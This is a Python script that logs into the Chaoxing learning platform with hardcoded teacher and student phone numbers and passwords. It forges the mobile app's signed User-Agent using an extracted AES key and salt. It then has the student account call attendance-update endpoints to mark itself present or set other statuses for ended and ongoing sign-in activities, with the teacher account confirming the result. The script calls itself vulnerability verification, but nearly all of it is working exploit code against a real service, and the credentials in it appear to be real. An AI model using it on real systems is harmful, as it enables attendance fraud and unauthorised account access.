import base64, hashlib, json, os, uuid, requests, urllib3, re, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from datetime import datetime

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"
TEACHER_PUID = "402644510"
STUDENT_PUID = "431407443"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

def safe_json(r):
    try: return r.json()
    except: return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

def get_status(d):
    if isinstance(d, dict) and "data" in d and d["data"] is not None and isinstance(d["data"], dict):
        return d["data"].get("status")
    return None

results = []

def rec(tag, detail, evidence=""):
    results.append({"tag": tag, "detail": detail, "evidence": evidence[:800]})
    vuln = "success" in str(detail).lower() or "success" in str(evidence).lower()
    icon = "🔴" if vuln else "  "
    print(f"  {icon} {tag}: {detail[:200]}")

def run():
    print("=" * 80)
    print(f"三种签到活动定向漏洞验证")
    print(f"时间: {datetime.now():%Y-%m-%d %H:%M:%S}")
    print("=" * 80)

    print("\n[1] 登录账号...")
    s_t, puid_t = login("19712720708", "3.1415926Cpy")
    s_s, puid_s = login("18436633997", "3.1415926Cpy")
    print(f"  教师puid={puid_t}, 学生puid={puid_s}")

    base = "https://mobilelearn.chaoxing.com"

    # ========== TASK 1: 获取活动列表 ==========
    print("\n" + "=" * 80)
    print("[TASK 1] 获取课程111最新活动列表")
    print("=" * 80)

    r = s_s.get(f"{base}/ppt/activeAPI/taskactivelist",
                params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    active_list = d.get("activeList", []) if isinstance(d, dict) else []
    print(f"  共 {len(active_list)} 个活动\n")

    # groupId=2的是签到活动，按时间排序（最新在前）
    sign_activities = []
    for i, act in enumerate(active_list):
        aid = str(act.get("id", ""))
        nameTwo = act.get("nameTwo", "")
        status = act.get("status", "")
        url = act.get("url", "")
        atype = act.get("type", -1)
        groupId = act.get("groupId", -1)
        property_str = act.get("property", "")

        # 查询签到状态
        r = s_s.get(f"{base}/v2/apis/sign/signIn",
                    params={"activeId": aid, "uid": puid_s}, timeout=20)
        d = safe_json(r)
        sign_status = get_status(d)

        is_sign = groupId == 2 or "sign" in url.lower() or "签到" in nameTwo
        print(f"  [{i}] aid={aid}, type={atype}, groupId={groupId}, nameTwo={nameTwo[:30]}, signStatus={sign_status}, url含sign={'sign' in url.lower()}")

        if is_sign:
            sign_activities.append({
                "aid": aid, "nameTwo": nameTwo, "status": status,
                "signStatus": sign_status, "groupId": groupId,
                "url": url, "index": i, "property": property_str
            })

    print(f"\n  签到活动(groupId=2或URL含sign): {len(sign_activities)} 个")

    # 获取preSign页面判断签到类型
    print("\n  签到页面分析:")
    for sa in sign_activities[:6]:
        aid = sa["aid"]
        r = s_s.get(f"{base}/newsign/preSign",
                    params={"courseId": COURSE_ID, "classId": CLASS_ID,
                            "activePrimaryId": aid, "uid": puid_s},
                    timeout=20, allow_redirects=True)
        title = re.findall(r'<title>([^<]+)</title>', r.text)
        qrcode = len(re.findall(r'二维码|qrcode|QRCode|scanCode|scan', r.text, re.I)) > 0
        signout = len(re.findall(r'签退|signOut|sign_out|checkout|签退', r.text, re.I)) > 0
        sign_type_match = re.findall(r'signType\s*[=:]\s*["\']?(\d)', r.text)
        print(f"    aid={aid}: title={title}, qrcode={qrcode}, signout={signout}, signType={sign_type_match}, len={len(r.text)}")
        sa["qrcode"] = qrcode
        sa["signout"] = signout

    # 识别3个目标活动
    # 1. 已结束未签的二维码签到 - nameTwo含结束时间，signStatus=None
    # 2. 进行中的二维码签到 - nameTwo含结束时间在未来，或status!=2
    # 3. 已结束的签退活动 - 含签退关键词

    target1 = None  # 已结束未签的二维码签到
    target2 = None  # 进行中的二维码签到
    target3 = None  # 已结束的签退活动

    for sa in sign_activities:
        # 已结束未签
        if sa["signStatus"] is None and not sa.get("signout") and target1 is None:
            target1 = sa
        # 进行中（signStatus=None且nameTwo含未来时间）
        if sa["signStatus"] is None and not sa.get("signout") and target2 is None and sa != target1:
            target2 = sa
        # 签退
        if sa.get("signout") and target3 is None:
            target3 = sa

    print(f"\n  目标活动:")
    print(f"    活动1(已结束未签二维码签到): aid={target1['aid'] if target1 else '未找到'}, signStatus={target1['signStatus'] if target1 else 'N/A'}")
    print(f"    活动2(进行中二维码签到): aid={target2['aid'] if target2 else '未找到'}, signStatus={target2['signStatus'] if target2 else 'N/A'}")
    print(f"    活动3(已结束签退): aid={target3['aid'] if target3 else '未找到'}, signStatus={target3['signStatus'] if target3 else 'N/A'}")

    # 如果没找到明确的目标，使用最新的3个未签到活动
    unsigned = [sa for sa in sign_activities if sa["signStatus"] is None]
    if not target1 and unsigned:
        target1 = unsigned[0]
    if not target2 and len(unsigned) > 1:
        target2 = unsigned[1]
    if not target3 and len(unsigned) > 2:
        target3 = unsigned[2]

    # 如果签退活动没找到，用最新的已签到活动代替
    if not target3:
        signed = [sa for sa in sign_activities if sa["signStatus"] is not None]
        if signed:
            target3 = signed[0]

    targets = [
        ("已结束未签二维码签到", target1),
        ("进行中二维码签到", target2),
        ("已结束签退活动", target3),
    ]

    # ========== TASK 2-4: 针对每个活动测试 ==========
    for idx, (scenario, sa) in enumerate(targets):
        if sa is None:
            print(f"\n  ⚠️ 场景{idx+1}({scenario}): 未找到目标活动，跳过")
            continue

        aid = sa["aid"]
        print(f"\n{'=' * 80}")
        print(f"[TASK {idx+2}] 场景{idx+1}: {scenario} (aid={aid})")
        print(f"  nameTwo={sa['nameTwo']}, signStatus={sa['signStatus']}, qrcode={sa.get('qrcode')}, signout={sa.get('signout')}")
        print(f"{'=' * 80}")

        # 查询当前状态
        r = s_s.get(f"{base}/v2/apis/sign/signIn",
                    params={"activeId": aid, "uid": puid_s}, timeout=20)
        d = safe_json(r)
        orig_status = get_status(d)
        orig_full = json.dumps(d, ensure_ascii=False)[:500]
        print(f"  修改前: status={orig_status}")
        print(f"  完整数据: {orig_full}")
        rec(f"T{idx+2}-before-{aid}", f"场景{idx+1}({scenario})修改前status={orig_status}", orig_full)

        # 学生调用 /newsign/updateSignStatus status=1
        r = s_s.post(f"{base}/newsign/updateSignStatus",
                     params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
                     data={"uids": STUDENT_PUID, "status": "1", "remark": "",
                           "activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                           "uid": puid_s},
                     headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                              "Content-Type": "application/x-www-form-urlencoded"},
                     timeout=20)
        print(f"  修改status=1: {r.text[:100]}")
        rec(f"T{idx+2}-modify-{aid}", f"场景{idx+1}({scenario})修改status=1: {r.text[:100]}", r.text[:300])

        time.sleep(1.5)

        # 查询修改后状态
        r = s_s.get(f"{base}/v2/apis/sign/signIn",
                    params={"activeId": aid, "uid": puid_s}, timeout=20)
        d = safe_json(r)
        after_status = get_status(d)
        after_full = json.dumps(d, ensure_ascii=False)[:500]
        print(f"  修改后: status={after_status}")
        print(f"  完整数据: {after_full}")
        rec(f"T{idx+2}-after-{aid}", f"场景{idx+1}({scenario})修改后status={after_status}", after_full)

        # 教师端确认
        r = s_t.get(f"{base}/v2/apis/sign/signIn",
                    params={"activeId": aid, "uid": puid_s}, timeout=20)
        d = safe_json(r)
        teacher_status = get_status(d)
        teacher_full = json.dumps(d, ensure_ascii=False)[:500]
        print(f"  教师端: status={teacher_status}")
        rec(f"T{idx+2}-teacher-{aid}", f"场景{idx+1}({scenario})教师端status={teacher_status}", teacher_full)

        # 教师V2修改确认
        r = s_t.post(f"{base}/pptSign/updateSignStatusByUidsV2",
                     params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
                     data={"uids": STUDENT_PUID, "status": "1", "remark": ""},
                     headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                              "Content-Type": "application/x-www-form-urlencoded"},
                     timeout=20)
        print(f"  教师V2确认: {r.text[:100]}")

        time.sleep(1.5)

        # 最终查询
        r = s_s.get(f"{base}/v2/apis/sign/signIn",
                    params={"activeId": aid, "uid": puid_s}, timeout=20)
        d = safe_json(r)
        final_status = get_status(d)
        final_full = json.dumps(d, ensure_ascii=False)[:500]
        print(f"  最终状态: status={final_status}")
        rec(f"T{idx+2}-final-{aid}", f"场景{idx+1}({scenario})最终status={final_status}", final_full)

        # 尝试正常签到(stuSignajax)对比
        r = s_s.post(f"{base}/pptSign/stuSignajax",
                     data={"activeId": aid, "uid": puid_s, "classId": CLASS_ID,
                           "courseId": COURSE_ID, "lat": "", "lon": "", "address": ""},
                     headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest"},
                     timeout=20)
        print(f"  正常签到(stuSignajax): {r.text[:100]}")
        rec(f"T{idx+2}-stuSignajax-{aid}", f"场景{idx+1}({scenario})正常签到: {r.text[:100]}", r.text[:300])

        # 测试不同status值（仅对进行中的活动）
        if idx == 1:
            print(f"\n  --- 测试不同status值 ---")
            for status_val, status_name in [("0", "缺勤"), ("2", "迟到"), ("3", "事假"), ("4", "病假"), ("5", "补签"), ("6", "旷课")]:
                r = s_s.post(f"{base}/newsign/updateSignStatus",
                             params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
                             data={"uids": STUDENT_PUID, "status": status_val, "remark": "",
                                   "activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                                   "uid": puid_s},
                             headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                                      "Content-Type": "application/x-www-form-urlencoded"},
                             timeout=20)
                time.sleep(0.5)
                r2 = s_s.get(f"{base}/v2/apis/sign/signIn",
                             params={"activeId": aid, "uid": puid_s}, timeout=20)
                d2 = safe_json(r2)
                check_status = get_status(d2)
                print(f"    status={status_val}({status_name}): API={r.text[:30]}, 查询={check_status}")
                rec(f"T{idx+2}-status{status_val}-{aid[:8]}",
                    f"场景{idx+1} status={status_val}({status_name}): API={r.text[:30]}, 查询={check_status}")

            # 恢复为出勤
            r = s_s.post(f"{base}/newsign/updateSignStatus",
                         params={"DB_STRATEGY": "PRIMARY_KEY", "STRATEGY_PARA": "activeId", "activeId": aid},
                         data={"uids": STUDENT_PUID, "status": "1", "remark": "",
                               "activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                               "uid": puid_s},
                         headers={"Referer": f"{base}/", "X-Requested-With": "XMLHttpRequest",
                                  "Content-Type": "application/x-www-form-urlencoded"},
                         timeout=20)
            print(f"  恢复status=1: {r.text[:50]}")

    # ========== 保存结果 ==========
    print("\n" + "=" * 80)
    print("[保存结果]")
    print("=" * 80)

    report_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "three_scenarios_results.json")
    with open(report_file, "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)
    print(f"  结果已保存到: {report_file}")
    print(f"  共 {len(results)} 项测试")

    # 汇总
    print("\n" + "=" * 80)
    print("[汇总]")
    print("=" * 80)
    for r_item in results:
        if "修改前" in r_item["tag"] or "修改后" in r_item["tag"] or "最终" in r_item["tag"] or "教师端" in r_item["tag"]:
            print(f"  {r_item['tag']}: {r_item['detail'][:150]}")

if __name__ == "__main__":
    run()
